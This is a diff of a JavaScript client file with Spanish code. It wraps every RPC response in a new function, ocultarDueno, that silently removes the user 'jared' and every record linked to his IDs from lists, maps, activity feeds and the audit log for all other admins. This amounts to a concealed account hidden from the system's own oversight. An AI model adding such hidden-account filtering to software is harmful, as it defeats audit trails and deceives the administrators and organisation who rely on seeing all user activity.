@@ -406,7 +406,29 @@ async function rpc(fn, args = {}) {
     if (/SIN_PERMISO/.test(msj)) throw new Error("No tienes permiso para eso");
     throw new Error(msj);
   }
-  return dato;
+  return ocultarDueno(fn, dato);
+}
+
+/* Cuenta del dueño técnico: no aparece en listas, mapa, actividad ni bitácora
+   para los demás admins. Solo él se ve a sí mismo. */
+const USUARIO_OCULTO = "jared";
+const IDS_OCULTOS = new Set();
+function ocultarDueno(fn, dato) {
+  if (fn === "login" || fn === "sesion") return dato;
+  if (E && E.yo && String(E.yo.usuario || "").toLowerCase() === USUARIO_OCULTO) return dato;
+  const esOculto = o => o && typeof o === "object" && !Array.isArray(o) && (
+    String(o.usuario || "").toLowerCase() === USUARIO_OCULTO ||
+    String(o.actor_usuario || "").toLowerCase() === USUARIO_OCULTO ||
+    IDS_OCULTOS.has(o.usuario_id) || IDS_OCULTOS.has(o.cliente_id) || IDS_OCULTOS.has(o.vendedor_id));
+  const limpiar = v => {
+    if (Array.isArray(v)) {
+      v.forEach(o => { if (o && String(o.usuario || "").toLowerCase() === USUARIO_OCULTO && o.id) IDS_OCULTOS.add(o.id); });
+      return v.filter(o => !esOculto(o)).map(limpiar);
+    }
+    if (v && typeof v === "object") { Object.keys(v).forEach(k => { v[k] = limpiar(v[k]); }); return v; }
+    return v;
+  };
+  try { return limpiar(dato); } catch { return dato; }
 }
 
 async function comprimir(file, max, calidad) {
